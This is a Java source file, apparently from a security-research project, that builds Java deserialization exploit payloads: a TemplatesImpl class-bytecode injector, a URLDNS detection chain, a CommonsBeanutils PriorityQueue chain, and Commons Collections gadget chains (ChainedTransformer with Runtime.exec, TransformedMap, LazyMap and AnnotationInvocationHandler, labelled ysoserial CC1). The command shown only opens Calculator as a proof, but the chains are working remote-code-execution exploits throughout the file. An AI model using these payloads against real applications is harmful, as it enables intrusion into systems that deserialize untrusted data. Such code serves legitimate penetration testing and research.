package expUtils;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.map.TransformedMap;
import sun.reflect.annotation.AnnotationType;

import java.io.*;
import java.lang.annotation.Annotation;
import java.lang.annotation.Retention;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.math.BigInteger;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;
import java.util.PriorityQueue;
import java.util.Random;

import static expUtils.ReflectUtils.getClassByte;

public class ExpUtils {

    private static String cmd = "/System/Applications/Calculator.app/Contents/MacOS/Calculator";

    public static TemplatesImpl getEvilTemplates() throws NoSuchFieldException, IllegalAccessException, IOException {
        TemplatesImpl templates = new TemplatesImpl();
        ReflectUtils.setFields(templates,"_name","9eek");
        byte[] evilCode = getClassByte("sec-common/target/classes/expUtils/TemplatesEvilClass.class");
//        byte[] evilCode = getObectClassByte(TemplatesEvilClass.class);
        byte[][] templatesEvilCode = new byte[][]{evilCode};
        ReflectUtils.setFields(templates,"_bytecodes",templatesEvilCode);
        ReflectUtils.setFields(templates,"_tfactory",new TransformerFactoryImpl());
//        templates.getOutputProperties();
        return templates;
    }
//    URLDNS链 带参数方式
    public static HashMap<Object,Object> getURLDNSChains(String targetUrl) throws MalformedURLException, NoSuchFieldException, IllegalAccessException {
        HashMap<Object,Object> hashMap = new HashMap<Object,Object>();
        URL url = new URL(null,targetUrl,new SilenceURLHandler());
        hashMap.put(url,"1");
        ReflectUtils.setFields(url,"hashCode",-1);
//        ReflectUtils.setFields(url,"handler",new SilenceURLHandler());
        return hashMap;
    }

    // 获取一个对象的class byte文件
    public static byte[] getSerialObectClassByte(Object obj) throws IOException {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(byteArrayOutputStream);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(bufferedOutputStream);
        objectOutputStream.writeObject(obj);
        bufferedOutputStream.close();
//        byteArrayOutputStream.close();

        return byteArrayOutputStream.toByteArray();
    }

    //    URLDNS链 默认方式
    public static HashMap<Object,Object> getURLDNSChains() throws MalformedURLException, NoSuchFieldException, IllegalAccessException {
        String prefix = String.valueOf(new Random().nextInt(100));
//        HashMap<Object,Object> hashMap = new HashMap<Object,Object>();
        String targetUrl  = "http://" + prefix + ".a.qq.com";
        return getURLDNSChains(targetUrl);
    }

//    序列化对象到特定路径
    public static String serialize(Object obj) throws IOException {
        String path = obj.getClass().getName() + ".ser";
        FileOutputStream fileOutputStream = new FileOutputStream(path);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(obj);
        objectOutputStream.flush();
        objectOutputStream.close();
        return path;
    }
//    反序列化特定路径文件为对象
    public static Object unserialize(String path) throws IOException, ClassNotFoundException {
        FileInputStream fileInputStream = new FileInputStream(path);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
//        Object obj = objectInputStream.readObject();
//        System.out.println(obj);
        return objectInputStream.readObject();
    }
//    commonBean payload
    public static Object getCommonBeanExp() throws IllegalAccessException, NoSuchFieldException, IOException {
        TemplatesImpl evilTemplates = getEvilTemplates();
        BeanComparator beanComparator = new BeanComparator();
        PriorityQueue<Object> queue =  new PriorityQueue<Object>(2,beanComparator);
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));
        ReflectUtils.setFields(beanComparator,"property","outputProperties");
        Field queueArr = ReflectUtils.getFields(queue,"queue");
        queueArr.setAccessible(true);
        Object[] obj = (Object[]) queueArr.get(queue);
        obj[0] = evilTemplates;
        obj[1] = evilTemplates;
        return queue;
    }

//    common collecions
    public static ChainedTransformer getEvilChainedTransformer(){
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",new Class[0]}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,new Object[0]}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{cmd})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        return chainedTransformer;
    }

//    获取恶意transformMap
    public static Map getEvilTransformMap(){
        Map<String,String> innerMap = new HashMap<String,String>();
//        这里的key 不是乱写的，不然不会触发。
        innerMap.put("value","value12312312");
        return TransformedMap.decorate(innerMap,null,getEvilChainedTransformer());
    }
    //
    public static Map getEvilLazyMap() throws InvocationTargetException, NoSuchMethodException, ClassNotFoundException, InstantiationException, IllegalAccessException {
        Map<String,String> innerMap = new HashMap<>();
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(innerMap, getEvilChainedTransformer());
        Map finalLazyMap = (Map) Proxy.newProxyInstance(lazyMap.getClass().getClassLoader(),lazyMap.getClass().getInterfaces(),getAnnotationHandler(lazyMap));
        return finalLazyMap;
    }

//    ysoserial cc1
    public static Object getCC1Exp() throws ClassNotFoundException, NoSuchMethodException, InstantiationException, IllegalAccessException, InvocationTargetException {
        return getAnnotationHandler(getEvilLazyMap());
    }

    public static InvocationHandler getAnnotationHandler(Map map) throws IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException, ClassNotFoundException {
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor =  clazz.getDeclaredConstructor(Class.class,Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, map);
        return handler;
    }

// AnnotationHandler setValue 方式触发
    public static Object getSetValueHandlerExp() throws ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException {
        return getAnnotationHandler(getEvilTransformMap());
    }




    public static void main(String[] args) throws IllegalAccessException, NoSuchFieldException, IOException, ClassNotFoundException, NoSuchMethodException, InstantiationException, InvocationTargetException {
       Map evilMap = getEvilLazyMap();
       evilMap.entrySet();

//        AnnotationType annotationType = AnnotationType.getInstance(Retention.class);
//        Map var6 = annotationType.memberTypes();

        //        System.out.println(System.getProperty("java.version"));
//        Object obj = getCC1Exp();
//        unserialize(serialize(obj));


    }
}
